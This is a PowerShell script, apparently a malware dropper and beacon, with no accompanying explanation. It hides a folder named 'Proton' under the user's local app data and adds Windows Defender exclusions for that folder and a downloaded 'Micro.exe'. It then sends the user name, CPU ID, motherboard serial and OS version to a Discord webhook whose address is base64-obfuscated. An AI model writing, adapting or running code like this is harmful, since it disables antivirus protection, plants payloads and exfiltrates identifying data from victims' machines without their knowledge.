$codeBlock = '```'
$separador = "--------------------------------"

$CPU = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty ProcessorId
$MOT = Get-WmiObject -Class Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber
$OS = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
$HOOK = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0NTk0MjU2MzE1NjM5Mzk5NC9CRGtybnVsLXhjQWxnUmpIalJPV1RmQjE3WlM3SFNLdnRYZWFGV0VTTy1OSlFmYzRKQWZqUGItS08yWlhSUVdJTTluWA=="))

function reportar {
    param (
        [string]$mensaje
    )
    
    try {
        $body = @{ content = $mensaje }
        $jsonData = $body | ConvertTo-Json -Depth 3        
        Invoke-RestMethod -Uri $HOOK -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8"
    }
    catch {
        Write-Host "Ocurrió un error al enviar el reporte: $($_.Exception.Message)"
    }
}

while ($true) {
    try {
        $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Proton"
        
        if (-not (Test-Path $root)) { New-Item -Path $root -ItemType Directory }
        
        Set-ItemProperty -Path $root -Name Attributes -Value Hidden

        $folderAttributes = (Get-ItemProperty -Path $root -Name Attributes).Attributes
        if (-not ($folderAttributes -band [System.IO.FileAttributes]::Hidden)) { Set-ItemProperty -Path $root -Name Attributes -Value Hidden }
        
        try { Add-MpPreference -ExclusionPath $root }
        catch { continue }

        try {
            $servicio = Join-Path -Path $root -ChildPath "Micro.exe"
            Invoke-WebRequest -Uri "https://www.sample-videos.com/text/Sample-text-file-10kb.txt" -OutFile $servicio
            Add-MpPreference -ExclusionProcess $servicio
        }
        catch { continue }

        $message = "$codeBlock`n$separador`nUSER: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)`nTIME: $(Get-Date)`n$separador`nCPU: $CPU`nMOT: $MOT`nSYS: $OS`n$separador`n$codeBlock"
        
        reportar $message
        break
    }
    catch {
        reportar "$codeBlock`nREPORTE: ERROR`n$($_.Exception.Message)`n$codeBlock"
        continue
    }
}